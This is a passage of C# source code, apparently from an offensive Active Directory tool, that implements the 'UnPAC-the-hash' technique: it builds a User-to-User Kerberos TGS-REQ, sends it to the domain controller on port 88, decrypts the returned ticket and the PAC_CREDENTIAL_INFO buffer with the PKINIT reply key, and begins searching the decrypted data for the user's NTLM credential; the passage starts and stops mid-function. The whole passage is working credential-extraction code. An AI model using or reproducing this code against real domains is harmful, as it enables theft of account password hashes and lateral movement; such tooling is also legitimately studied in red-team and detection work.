                    UnpacTheHash.KERB_ETYPE.aes256_cts_hmac_sha1,
                    3, // KRB_KEY_USAGE_AS_REP_ENCPART
                    replyKey,
                    encPart);

                // Parse EncASRepPart to extract session key
                int offset = 0;

                // Skip APPLICATION 25 tag
                if (decrypted[offset] == 0x79)
                {
                    offset++;
                    offset += DecodeLength(decrypted, offset, out _);
                }

                // Skip SEQUENCE
                if (decrypted[offset] == 0x30)
                {
                    offset++;
                    offset += DecodeLength(decrypted, offset, out _);
                }

                // Find key [0]
                if (decrypted[offset] == 0xA0)
                {
                    offset++;
                    offset += DecodeLength(decrypted, offset, out _);

                    // EncryptionKey SEQUENCE
                    if (decrypted[offset] == 0x30)
                    {
                        offset++;
                        offset += DecodeLength(decrypted, offset, out _);

                        // Skip keytype [0]
                        if (decrypted[offset] == 0xA0)
                        {
                            offset++;
                            int len;
                            offset += DecodeLength(decrypted, offset, out len);
                            offset += len;
                        }

                        // Get keyvalue [1]
                        if (decrypted[offset] == 0xA1)
                        {
                            offset++;
                            offset += DecodeLength(decrypted, offset, out _);
                            if (decrypted[offset] == 0x04)
                            {
                                offset++;
                                int keyLen;
                                offset += DecodeLength(decrypted, offset, out keyLen);
                                byte[] sessionKey = new byte[keyLen];
                                Array.Copy(decrypted, offset, sessionKey, 0, keyLen);
                                return sessionKey;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error extracting session key: {ex.Message}");
            }
            return null;
        }

        private static byte[] ExtractEncPartCipher(byte[] asRep)
        {
            int offset = 0;

            // Skip APPLICATION 11 tag
            if (asRep[offset] == 0x6B)
            {
                offset++;
                offset += DecodeLength(asRep, offset, out _);
            }

            // Skip outer SEQUENCE
            if (asRep[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(asRep, offset, out _);
            }

            // Find enc-part [6]
            while (offset < asRep.Length - 10)
            {
                if (asRep[offset] == 0xA6)
                {
                    offset++;
                    offset += DecodeLength(asRep, offset, out _);

                    // EncryptedData SEQUENCE
                    if (asRep[offset] == 0x30)
                    {
                        offset++;
                        int encDataLen;
                        offset += DecodeLength(asRep, offset, out encDataLen);
                        int encDataEnd = offset + encDataLen;

                        // Find cipher [2]
                        while (offset < encDataEnd)
                        {
                            if (asRep[offset] == 0xA2)
                            {
                                offset++;
                                offset += DecodeLength(asRep, offset, out _);
                                if (asRep[offset] == 0x04)
                                {
                                    offset++;
                                    int cipherLen;
                                    offset += DecodeLength(asRep, offset, out cipherLen);
                                    byte[] cipher = new byte[cipherLen];
                                    Array.Copy(asRep, offset, cipher, 0, cipherLen);
                                    return cipher;
                                }
                            }
                            else if ((asRep[offset] & 0xE0) == 0xA0)
                            {
                                offset++;
                                int skipLen;
                                offset += DecodeLength(asRep, offset, out skipLen);
                                offset += skipLen;
                            }
                            else offset++;
                        }
                    }
                    break;
                }
                else if ((asRep[offset] & 0xE0) == 0xA0)
                {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(asRep, offset, out skipLen);
                    offset += skipLen;
                }
                else offset++;
            }
            return null;
        }

        
        /// Perform U2U (User-to-User) TGS-REQ to extract credentials from PAC
        private static void PerformU2UTgsRequest(string kdcHost, string user, string domain, byte[] tgt, byte[] sessionKey)
        {
            OutputHelper.Verbose($"[*] Building U2U TGS-REQ for {user}@{domain.ToUpper()}...");

            try
            {
                // Build TGS-REQ
                // KDC-OPTIONS per RFC 4120:
                // bit 1 = 0x40000000 = forwardable
                // bit 8 = 0x00800000 = renewable
                // bit 15 = 0x00010000 = canonicalize
                // bit 27 = 0x00000010 = renewable-ok
                // bit 28 = 0x00000008 = enc-tkt-in-skey (required for U2U)
                uint kdcOptions = 0x40810018;

                // Generate random nonce
                Random rng = new Random();
                int nonce = rng.Next();

                // Build the TGS-REQ
                byte[] tgsReq = BuildU2UTgsReq(user, domain, tgt, sessionKey, kdcOptions, nonce);

                OutputHelper.Verbose($"[+] TGS-REQ built ({tgsReq.Length} bytes)");

                // Send to KDC
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(kdcHost, 88);
                    OutputHelper.Verbose($"[*] Connected to KDC {kdcHost}:88");

                    using (NetworkStream stream = client.GetStream())
                    {
                        // Send length prefix + data
                        byte[] lengthPrefix = BitConverter.GetBytes(tgsReq.Length);
                        if (BitConverter.IsLittleEndian) Array.Reverse(lengthPrefix);
                        stream.Write(lengthPrefix, 0, 4);
                        stream.Write(tgsReq, 0, tgsReq.Length);

                        // Read response
                        byte[] respLen = new byte[4];
                        stream.Read(respLen, 0, 4);
                        if (BitConverter.IsLittleEndian) Array.Reverse(respLen);
                        int responseLen = BitConverter.ToInt32(respLen, 0);

                        byte[] response = new byte[responseLen];
                        int totalRead = 0;
                        while (totalRead < responseLen)
                        {
                            int read = stream.Read(response, totalRead, responseLen - totalRead);
                            if (read == 0) break;
                            totalRead += read;
                        }

                        OutputHelper.Verbose($"[+] Received TGS-REP ({totalRead} bytes)");

                        // Check if it's an error
                        if (response[0] == 0x7E) // KRB-ERROR (APPLICATION 30)
                        {
                            Console.WriteLine("[!] KDC returned error");
                            ParseKrbError(response);
                            return;
                        }

                        // Parse TGS-REP (APPLICATION 13)
                        if (response[0] == 0x6D)
                        {
                            OutputHelper.Verbose("[+] Received TGS-REP!");
                            ExtractCredentialsFromTgsRep(response, sessionKey);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] U2U TGS-REQ error: {ex.Message}");
            }
        }

        
        /// Build TGS-REQ with U2U (enc-tkt-in-skey) option
        private static byte[] BuildU2UTgsReq(string user, string domain, byte[] tgt, byte[] sessionKey, uint kdcOptions, int nonce)
        {
            List<byte> tgsReq = new List<byte>();
            string realm = domain.ToUpper();
            string sname = user;

            // Build req-body first
            List<byte> reqBody = new List<byte>();

            // kdc-options [0] BIT STRING
            byte[] kdcOptionsBytes = new byte[] {
                (byte)(kdcOptions >> 24),
                (byte)(kdcOptions >> 16),
                (byte)(kdcOptions >> 8),
                (byte)kdcOptions
            };
            byte[] kdcOptionsAsn = BuildContextTag(0, BuildBitString(kdcOptionsBytes));
            reqBody.AddRange(kdcOptionsAsn);

            // realm [2] Realm
            byte[] realmAsn = BuildContextTag(2, BuildGeneralString(realm));
            reqBody.AddRange(realmAsn);

            // sname [3] PrincipalName - target is ourselves
            byte[] snameAsn = BuildPrincipalName(1, new string[] { sname }); // NT_PRINCIPAL
            reqBody.AddRange(BuildContextTag(3, snameAsn));

            // till [5] KerberosTime
            string till = DateTime.UtcNow.AddDays(1).ToString("yyyyMMddHHmmss") + "Z";
            byte[] tillAsn = BuildContextTag(5, BuildGeneralizedTime(till));
            reqBody.AddRange(tillAsn);

            // nonce [7] UInt32
            byte[] nonceBytes = BitConverter.GetBytes(nonce);
            if (BitConverter.IsLittleEndian) Array.Reverse(nonceBytes);
            byte[] nonceAsn = BuildContextTag(7, BuildInteger(nonceBytes));
            reqBody.AddRange(nonceAsn);

            // etype [8] SEQUENCE OF Int32 - include multiple etypes for compatibility
            byte[] etypeAsn = BuildContextTag(8, BuildSequence(
                Combine(
                    BuildInteger(new byte[] { 0x12 }),  // AES256 (18)
                    BuildInteger(new byte[] { 0x11 }),  // AES128 (17)
                    BuildInteger(new byte[] { 0x17 })   // RC4 (23)
                )
            ));
            reqBody.AddRange(etypeAsn);

            // additional-tickets [11] - our TGT for U2U
            byte[] additionalTicketsAsn = BuildContextTag(11, BuildSequence(tgt));
            reqBody.AddRange(additionalTicketsAsn);

            byte[] reqBodySeq = BuildSequence(reqBody.ToArray());

            // Build authenticator with checksum of req-body (required for TGS-REQ)
            byte[] authenticator = BuildU2UAuthenticator(user, realm, sessionKey, reqBodySeq);
            OutputHelper.Verbose($"[*] Authenticator built ({authenticator.Length} bytes)");
            OutputHelper.Verbose($"[*] Session key for encryption: {BitConverter.ToString(sessionKey).Replace("-", "").Substring(0, 32)}...");

            // Encrypt authenticator with session key (key usage 7 = TGS-REQ PA-TGS-REQ)
            byte[] encAuthenticator = KerberosEncrypt(UnpacTheHash.KERB_ETYPE.aes256_cts_hmac_sha1, 7, sessionKey, authenticator);
            OutputHelper.Verbose($"[*] Encrypted authenticator ({encAuthenticator.Length} bytes)");

            // Build AP-REQ
            byte[] apReq = BuildU2UApReq(tgt, encAuthenticator);
            OutputHelper.Verbose($"[*] AP-REQ built ({apReq.Length} bytes)");

            // PA-TGS-REQ (padata-type 1)
            byte[] paTgsReq = BuildSequence(
                BuildContextTag(1, BuildInteger(new byte[] { 0x01 })), // padata-type = 1
                BuildContextTag(2, BuildOctetString(apReq))            // padata-value
            );

            // padata [3] SEQUENCE OF PA-DATA
            byte[] padataAsn = BuildContextTag(3, BuildSequence(paTgsReq));

            // Build TGS-REQ
            List<byte> tgsReqContent = new List<byte>();

            // pvno [1] INTEGER 5
            tgsReqContent.AddRange(BuildContextTag(1, BuildInteger(new byte[] { 0x05 })));

            // msg-type [2] INTEGER 12 (TGS-REQ)
            tgsReqContent.AddRange(BuildContextTag(2, BuildInteger(new byte[] { 0x0C })));

            // padata [3]
            tgsReqContent.AddRange(padataAsn);

            // req-body [4]
            tgsReqContent.AddRange(BuildContextTag(4, reqBodySeq));

            byte[] tgsReqSeq = BuildSequence(tgsReqContent.ToArray());

            // Wrap in APPLICATION 12
            return BuildApplication(12, tgsReqSeq);
        }

        // P/Invoke for Kerberos checksum
        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int CDLocateCheckSum(int cksumType, out IntPtr pCheckSum);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_CHECKSUM_Initialize(int keyUsage, out IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_CHECKSUM_InitializeEx(byte[] key, int keySize, int keyUsage, out IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_CHECKSUM_Sum(IntPtr pContext, int dataSize, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_CHECKSUM_Finalize(IntPtr pContext, byte[] output);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_CHECKSUM_Finish(ref IntPtr pContext);

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_CHECKSUM
        {
            public int Type;
            public int Size;
            public int Flag;
            public IntPtr Initialize;
            public IntPtr Sum;
            public IntPtr Finalize;
            public IntPtr Finish;
            public IntPtr InitializeEx;
            public IntPtr InitializeEx2;
        }

        
        /// Compute Kerberos checksum using Windows crypto (cryptdll.dll)
        private static byte[] ComputeKerberosChecksum(byte[] key, byte[] data, int keyUsage)
        {
            // For AES256, use checksum type 16 (hmac-sha1-96-aes256)
            const int KERB_CHECKSUM_HMAC_SHA1_96_AES256 = 16;

            IntPtr pCheckSumPtr;
            int status = CDLocateCheckSum(KERB_CHECKSUM_HMAC_SHA1_96_AES256, out pCheckSumPtr);
            if (status != 0)
                throw new Exception($"CDLocateCheckSum failed: 0x{status:X8}");

            KERB_CHECKSUM pCheckSum = (KERB_CHECKSUM)Marshal.PtrToStructure(pCheckSumPtr, typeof(KERB_CHECKSUM));

            // Use InitializeEx with the key
            var initializeExFunc = (KERB_CHECKSUM_InitializeEx)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.InitializeEx, typeof(KERB_CHECKSUM_InitializeEx));
            var sumFunc = (KERB_CHECKSUM_Sum)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.Sum, typeof(KERB_CHECKSUM_Sum));
            var finalizeFunc = (KERB_CHECKSUM_Finalize)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.Finalize, typeof(KERB_CHECKSUM_Finalize));
            var finishFunc = (KERB_CHECKSUM_Finish)Marshal.GetDelegateForFunctionPointer(
                pCheckSum.Finish, typeof(KERB_CHECKSUM_Finish));

            IntPtr pContext;
            status = initializeExFunc(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Exception($"Checksum InitializeEx failed: 0x{status:X8}");

            status = sumFunc(pContext, data.Length, data);
            if (status != 0)
            {
                finishFunc(ref pContext);
                throw new Exception($"Checksum Sum failed: 0x{status:X8}");
            }

            byte[] checksum = new byte[pCheckSum.Size];
            status = finalizeFunc(pContext, checksum);
            finishFunc(ref pContext);

            if (status != 0)
                throw new Exception($"Checksum Finalize failed: 0x{status:X8}");

            return checksum;
        }

        private static byte[] BuildU2UAuthenticator(string user, string realm, byte[] sessionKey, byte[] reqBody)
        {
            List<byte> auth = new List<byte>();

            // authenticator-vno [0] INTEGER 5
            auth.AddRange(BuildContextTag(0, BuildInteger(new byte[] { 0x05 })));

            // crealm [1] Realm
            auth.AddRange(BuildContextTag(1, BuildGeneralString(realm)));

            // cname [2] PrincipalName
            byte[] cnameAsn = BuildPrincipalName(1, new string[] { user });
            auth.AddRange(BuildContextTag(2, cnameAsn));

            // cksum [3] Checksum - checksum of req-body (required for TGS-REQ)
            // Checksum ::= SEQUENCE { cksumtype [0] Int32, checksum [1] OCTET STRING }
            // For AES256-CTS-HMAC-SHA1, cksumtype = 16 (hmac-sha1-96-aes256)
            // Key usage 6 = TGS-REQ PA-TGS-REQ AP-REQ Authenticator cksum
            byte[] checksumValue = ComputeKerberosChecksum(sessionKey, reqBody, 6);
            List<byte> checksumSeq = new List<byte>();
            checksumSeq.AddRange(BuildContextTag(0, BuildInteger(new byte[] { 0x10 }))); // cksumtype = 16
            checksumSeq.AddRange(BuildContextTag(1, BuildOctetString(checksumValue)));
            auth.AddRange(BuildContextTag(3, BuildSequence(checksumSeq.ToArray())));

            // cusec [4] Microseconds - NOTE: [4] not [6]!
            int cusec = DateTime.UtcNow.Millisecond * 1000;
            byte[] cusecBytes = BitConverter.GetBytes(cusec);
            if (BitConverter.IsLittleEndian) Array.Reverse(cusecBytes);
            // Trim leading zeros
            int start = 0;
            while (start < cusecBytes.Length - 1 && cusecBytes[start] == 0) start++;
            byte[] trimmedCusec = new byte[cusecBytes.Length - start];
            Array.Copy(cusecBytes, start, trimmedCusec, 0, trimmedCusec.Length);
            auth.AddRange(BuildContextTag(4, BuildInteger(trimmedCusec)));

            // ctime [5] KerberosTime
            string ctime = DateTime.UtcNow.ToString("yyyyMMddHHmmss") + "Z";
            auth.AddRange(BuildContextTag(5, BuildGeneralizedTime(ctime)));

            byte[] authSeq = BuildSequence(auth.ToArray());

            // Wrap in APPLICATION 2
            return BuildApplication(2, authSeq);
        }

        private static byte[] BuildU2UApReq(byte[] ticket, byte[] encAuthenticator)
        {
            List<byte> apReq = new List<byte>();

            // pvno [0] INTEGER 5
            apReq.AddRange(BuildContextTag(0, BuildInteger(new byte[] { 0x05 })));

            // msg-type [1] INTEGER 14 (AP-REQ)
            apReq.AddRange(BuildContextTag(1, BuildInteger(new byte[] { 0x0E })));

            // ap-options [2] APOptions (BIT STRING)
            apReq.AddRange(BuildContextTag(2, BuildBitString(new byte[] { 0x00, 0x00, 0x00, 0x00 })));

            // ticket [3]
            apReq.AddRange(BuildContextTag(3, ticket));

            // authenticator [4] EncryptedData
            byte[] encData = BuildSequence(
                BuildContextTag(0, BuildInteger(new byte[] { 0x12 })), // etype AES256
                BuildContextTag(2, BuildOctetString(encAuthenticator))  // cipher
            );
            apReq.AddRange(BuildContextTag(4, encData));

            byte[] apReqSeq = BuildSequence(apReq.ToArray());

            // Wrap in APPLICATION 14
            return BuildApplication(14, apReqSeq);
        }

        private static byte[] BuildBitString(byte[] data)
        {
            byte[] result = new byte[3 + data.Length]; // tag + length + unused_bits + data
            result[0] = 0x03; // BIT STRING tag
            result[1] = (byte)(data.Length + 1); // length includes unused bits byte
            result[2] = 0x00; // unused bits
            Array.Copy(data, 0, result, 3, data.Length);
            return result;
        }

        
        /// Encrypt data using Windows Kerberos crypto
        private static byte[] KerberosEncrypt(UnpacTheHash.KERB_ETYPE etype, int keyUsage, byte[] key, byte[] data)
        {
            // Use cryptdll.dll for encryption
            IntPtr pCSystemPtr;
            int status = CDLocateCSystem((int)etype, out pCSystemPtr);
            if (status != 0)
                throw new Exception($"CDLocateCSystem failed: 0x{status:X8}");

            KERB_ECRYPT pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));

            IntPtr pContext;
            var initFunc = (KERB_ECRYPT_Initialize)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Initialize, typeof(KERB_ECRYPT_Initialize));
            var encryptFunc = (KERB_ECRYPT_Encrypt)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Encrypt, typeof(KERB_ECRYPT_Encrypt));
            var finishFunc = (KERB_ECRYPT_Finish)Marshal.GetDelegateForFunctionPointer(
                pCSystem.Finish, typeof(KERB_ECRYPT_Finish));

            status = initFunc(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Exception($"Initialize failed: 0x{status:X8}");

            // Output size = data + checksum + confounder
            int outputSize = data.Length + pCSystem.Size;
            byte[] output = new byte[outputSize];

            status = encryptFunc(pContext, data, data.Length, output, ref outputSize);
            finishFunc(ref pContext);

            if (status != 0)
                throw new Exception($"Encrypt failed: 0x{status:X8}");

            return output.Take(outputSize).ToArray();
        }

        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int CDLocateCSystem(int etype, out IntPtr pCheckSum);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_ECRYPT_Initialize(byte[] key, int keySize, int keyUsage, out IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_ECRYPT_Encrypt(IntPtr pContext, byte[] data, int dataSize, byte[] output, ref int outputSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int KERB_ECRYPT_Finish(ref IntPtr pContext);

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_ECRYPT
        {
            public int Type0;
            public int BlockSize;
            public int Type1;
            public int KeySize;
            public int Size;
            public int Type2;
            public int Type3;
            public IntPtr AlgName;
            public IntPtr Initialize;
            public IntPtr Encrypt;
            public IntPtr Decrypt;
            public IntPtr Finish;
            public IntPtr HashPassword;
            public IntPtr RandomKey;
            public IntPtr Control;
            public IntPtr unk0_null;
            public IntPtr unk1_null;
            public IntPtr unk2_null;
        }

        
        /// Extract credentials from TGS-REP
        private static void ExtractCredentialsFromTgsRep(byte[] tgsRep, byte[] sessionKey)
        {
            OutputHelper.Verbose("[*] Parsing TGS-REP to extract credentials...");

            try
            {
                // TGS-REP [APPLICATION 13] structure:
                // - pvno [0], msg-type [1], padata [2] optional, crealm [3], cname [4], ticket [5], enc-part [6]

                int offset = 0;

                // Skip APPLICATION 13
                if (tgsRep[offset] == 0x6D)
                {
                    offset++;
                    offset += DecodeLength(tgsRep, offset, out _);
                }

                // Skip outer SEQUENCE
                if (tgsRep[offset] == 0x30)
                {
                    offset++;
                    offset += DecodeLength(tgsRep, offset, out _);
                }

                // Find ticket [5] which contains the PAC
                byte[] ticket = null;
                int ticketOffset = -1;

                while (offset < tgsRep.Length - 10)
                {
                    if (tgsRep[offset] == 0xA5) // ticket [5]
                    {
                        ticketOffset = offset;
                        offset++;
                        int ticketLen;
                        offset += DecodeLength(tgsRep, offset, out ticketLen);
                        ticket = new byte[ticketLen];
                        Array.Copy(tgsRep, offset, ticket, 0, ticketLen);
                        OutputHelper.Verbose($"[+] Found ticket ({ticketLen} bytes)");
                        break;
                    }
                    else if ((tgsRep[offset] & 0xE0) == 0xA0)
                    {
                        offset++;
                        int skipLen;
                        offset += DecodeLength(tgsRep, offset, out skipLen);
                        offset += skipLen;
                    }
                    else
                    {
                        offset++;
                    }
                }

                if (ticket == null)
                {
                    Console.WriteLine("[!] Could not find ticket in TGS-REP");
                    return;
                }

                // The ticket enc-part is encrypted with our TGT's session key (U2U)
                // Extract and decrypt it
                byte[] ticketEncPart = ExtractTicketEncPart(ticket);
                if (ticketEncPart == null)
                {
                    Console.WriteLine("[!] Could not extract ticket enc-part");
                    return;
                }

                OutputHelper.Verbose($"[+] Extracted ticket enc-part ({ticketEncPart.Length} bytes)");

                // Decrypt with session key (key usage 2 = Ticket enc-part for U2U)
                // In U2U, the ticket enc-part is encrypted with the TGT's session key
                try
                {
                    byte[] decryptedTicket = UnpacTheHash.KerberosDecrypt(
                        UnpacTheHash.KERB_ETYPE.aes256_cts_hmac_sha1,
                        2, // Key usage 2 for ticket enc-part
                        sessionKey,
                        ticketEncPart);

                    OutputHelper.Verbose($"[+] Decrypted ticket ({decryptedTicket.Length} bytes)");

                    // Parse EncTicketPart to find PAC
                    ExtractPacFromEncTicketPart(decryptedTicket, sessionKey);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Failed to decrypt ticket: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error parsing TGS-REP: {ex.Message}");
            }
        }

        private static byte[] ExtractTicketEncPart(byte[] ticket)
        {
            int offset = 0;

            // Skip APPLICATION 1 if present
            if (ticket[offset] == 0x61)
            {
                offset++;
                offset += DecodeLength(ticket, offset, out _);
            }

            // Skip SEQUENCE
            if (ticket[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(ticket, offset, out _);
            }

            // Find enc-part [3]
            while (offset < ticket.Length - 10)
            {
                if (ticket[offset] == 0xA3) // enc-part [3]
                {
                    offset++;
                    offset += DecodeLength(ticket, offset, out _);

                    // EncryptedData SEQUENCE
                    if (ticket[offset] == 0x30)
                    {
                        offset++;
                        int encDataLen;
                        offset += DecodeLength(ticket, offset, out encDataLen);
                        int encDataEnd = offset + encDataLen;

                        // Find cipher [2]
                        while (offset < encDataEnd)
                        {
                            if (ticket[offset] == 0xA2)
                            {
                                offset++;
                                offset += DecodeLength(ticket, offset, out _);
                                if (ticket[offset] == 0x04)
                                {
                                    offset++;
                                    int cipherLen;
                                    offset += DecodeLength(ticket, offset, out cipherLen);
                                    byte[] cipher = new byte[cipherLen];
                                    Array.Copy(ticket, offset, cipher, 0, cipherLen);
                                    return cipher;
                                }
                            }
                            else if ((ticket[offset] & 0xE0) == 0xA0)
                            {
                                offset++;
                                int skipLen;
                                offset += DecodeLength(ticket, offset, out skipLen);
                                offset += skipLen;
                            }
                            else offset++;
                        }
                    }
                    break;
                }
                else if ((ticket[offset] & 0xE0) == 0xA0)
                {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(ticket, offset, out skipLen);
                    offset += skipLen;
                }
                else offset++;
            }
            return null;
        }

        private static void ExtractPacFromEncTicketPart(byte[] encTicketPart, byte[] sessionKey)
        {
            OutputHelper.Verbose("[*] Parsing EncTicketPart to find PAC...");

            int offset = 0;

            // Skip APPLICATION 3 if present
            if (encTicketPart[offset] == 0x63)
            {
                offset++;
                offset += DecodeLength(encTicketPart, offset, out _);
            }

            // Skip SEQUENCE
            if (encTicketPart[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(encTicketPart, offset, out _);
            }

            // Find authorization-data [10]
            while (offset < encTicketPart.Length - 10)
            {
                if (encTicketPart[offset] == 0xAA) // [10] authorization-data
                {
                    offset++;
                    int authDataLen;
                    offset += DecodeLength(encTicketPart, offset, out authDataLen);
                    OutputHelper.Verbose($"[+] Found authorization-data ({authDataLen} bytes)");

                    // Parse authorization data to find PAC (ad-type 128)
                    byte[] authData = new byte[authDataLen];
                    Array.Copy(encTicketPart, offset, authData, 0, authDataLen);
                    ExtractPacFromAuthData(authData, sessionKey);
                    return;
                }
                else if ((encTicketPart[offset] & 0xE0) == 0xA0)
                {
                    offset++;
                    int skipLen;
                    offset += DecodeLength(encTicketPart, offset, out skipLen);
                    offset += skipLen;
                }
                else
                {
                    offset++;
                }
            }

            Console.WriteLine("[!] Could not find authorization-data in EncTicketPart");
        }

        private static void ExtractPacFromAuthData(byte[] authData, byte[] sessionKey)
        {
            // AuthorizationData is SEQUENCE OF AuthorizationDataElement
            // Each element has ad-type [0] and ad-data [1]
            // AD-IF-RELEVANT (ad-type 1) contains nested authorization data
            // PAC is ad-type 128

            int offset = 0;

            // Skip SEQUENCE
            if (authData[offset] == 0x30)
            {
                offset++;
                offset += DecodeLength(authData, offset, out _);
            }

            while (offset < authData.Length - 5)
            {
                if (authData[offset] == 0x30) // AuthorizationDataElement
                {
                    offset++;
                    int elemLen;
                    offset += DecodeLength(authData, offset, out elemLen);
                    int elemEnd = offset + elemLen;

                    int adType = -1;
                    byte[] adData = null;

                    while (offset < elemEnd)
                    {
                        if (authData[offset] == 0xA0) // ad-type [0]
                        {
                            offset++;
                            offset += DecodeLength(authData, offset, out _);
                            if (authData[offset] == 0x02)
                            {
                                offset++;
                                int intLen = authData[offset++];
                                adType = 0;
                                for (int i = 0; i < intLen; i++)
                                    adType = (adType << 8) | authData[offset++];
                            }
                        }
                        else if (authData[offset] == 0xA1) // ad-data [1]
                        {
                            offset++;
                            int dataLen;
                            offset += DecodeLength(authData, offset, out dataLen);
                            if (authData[offset] == 0x04)
                            {
                                offset++;
                                int octetLen;
                                offset += DecodeLength(authData, offset, out octetLen);
                                adData = new byte[octetLen];
                                Array.Copy(authData, offset, adData, 0, octetLen);
                                offset += octetLen;
                            }
                        }
                        else
                        {
                            offset++;
                        }
                    }

                    if (adType == 1 && adData != null) // AD-IF-RELEVANT - recurse
                    {
                        ExtractPacFromAuthData(adData, sessionKey);
                    }
                    else if (adType == 128 && adData != null) // PAC
                    {
                        OutputHelper.Verbose($"[+] Found PAC ({adData.Length} bytes)!");
                        ParsePac(adData, sessionKey);
                        return;
                    }
                }
                else
                {
                    offset++;
                }
            }
        }

        private static void ParsePac(byte[] pac, byte[] sessionKey)
        {
            OutputHelper.Verbose("[*] Parsing PAC structure...");

            // PAC structure:
            // PACTYPE:
            //   cBuffers (4 bytes)
            //   Version (4 bytes)
            //   Buffers[] (PAC_INFO_BUFFER)
            //
            // PAC_INFO_BUFFER:
            //   ulType (4 bytes)
            //   cbBufferSize (4 bytes)
            //   Offset (8 bytes)

            if (pac.Length < 8)
            {
                Console.WriteLine("[!] PAC too small");
                return;
            }

            uint cBuffers = BitConverter.ToUInt32(pac, 0);
            uint version = BitConverter.ToUInt32(pac, 4);

            OutputHelper.Verbose($"[*] PAC has {cBuffers} buffers, version {version}");

            int offset = 8;
            for (uint i = 0; i < cBuffers && offset + 16 <= pac.Length; i++)
            {
                uint ulType = BitConverter.ToUInt32(pac, offset);
                uint cbBufferSize = BitConverter.ToUInt32(pac, offset + 4);
                ulong bufferOffset = BitConverter.ToUInt64(pac, offset + 8);

                OutputHelper.Verbose($"[*] Buffer {i}: Type={ulType}, Size={cbBufferSize}, Offset={bufferOffset}");

                // Type 2 = PAC_CREDENTIAL_INFO
                if (ulType == 2 && bufferOffset + cbBufferSize <= (ulong)pac.Length)
                {
                    OutputHelper.Verbose("[+] Found PAC_CREDENTIAL_INFO!");
                    byte[] credInfo = new byte[cbBufferSize];
                    Array.Copy(pac, (int)bufferOffset, credInfo, 0, (int)cbBufferSize);
                    ParsePacCredentialInfo(credInfo, sessionKey);
                }

                offset += 16;
            }
        }

        private static void ParsePacCredentialInfo(byte[] credInfo, byte[] sessionKey)
        {
            // PAC_CREDENTIAL_INFO:
            //   Version (4 bytes) = 0
            //   EncryptionType (4 bytes)
            //   SerializedData (variable, encrypted)

            if (credInfo.Length < 8)
            {
                Console.WriteLine("[!] PAC_CREDENTIAL_INFO too small");
                return;
            }

            uint pacVersion = BitConverter.ToUInt32(credInfo, 0);
            uint encType = BitConverter.ToUInt32(credInfo, 4);

            OutputHelper.Verbose($"[*] PAC_CREDENTIAL_INFO: Version={pacVersion}, EncType={encType}");

            byte[] encData = new byte[credInfo.Length - 8];
            Array.Copy(credInfo, 8, encData, 0, encData.Length);

            // PAC_CREDENTIAL_INFO must be decrypted with the AS reply key (DH derived key)
            // NOT the TGT session key!
            byte[] decryptKey = _dhReplyKey ?? sessionKey;
            OutputHelper.Verbose($"[*] Using {(_dhReplyKey != null ? "DH reply key" : "session key")} for decryption");
            OutputHelper.Verbose($"[*] Decrypt key (first 16 bytes): {BitConverter.ToString(decryptKey.Take(16).ToArray())}");

            // Decrypt with AS reply key (key usage 16 = KRB_KEY_USAGE_PA_PAC_CREDENTIALS)
            try
            {
                UnpacTheHash.KERB_ETYPE etype = (UnpacTheHash.KERB_ETYPE)encType;
                byte[] decrypted = UnpacTheHash.KerberosDecrypt(etype, 16, decryptKey, encData);

                OutputHelper.Verbose($"[+] Decrypted PAC credentials ({decrypted.Length} bytes)!");

                // Parse PAC_CREDENTIAL_DATA (NDR encoded)
                ParsePacCredentialData(decrypted);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to decrypt PAC_CREDENTIAL_INFO: {ex.Message}");
            }
        }

        private static void ParsePacCredentialData(byte[] data)
        {
            // PAC_CREDENTIAL_DATA is NDR encoded
            // Contains CredentialCount and array of SECPKG_SUPPLEMENTAL_CRED
            // Each credential has PackageName, CredentialSize, Credentials

            OutputHelper.Verbose($"[*] Parsing PAC_CREDENTIAL_DATA ({data.Length} bytes)...");
            OutputHelper.Verbose($"[*] Raw data: {BitConverter.ToString(data.Take(Math.Min(64, data.Length)).ToArray())}");

            // Look for "NTLM" string in Unicode (4E-00-54-00-4C-00-4D-00)
            byte[] ntlmPattern = new byte[] { 0x4E, 0x00, 0x54, 0x00, 0x4C, 0x00, 0x4D, 0x00 };
            int ntlmOffset = -1;

            for (int i = 0; i <= data.Length - ntlmPattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < ntlmPattern.Length; j++)
                {
                    if (data[i + j] != ntlmPattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                {
                    ntlmOffset = i;
                    OutputHelper.Verbose($"[*] Found 'NTLM' string at offset {i}");
                    break;
                }
            }

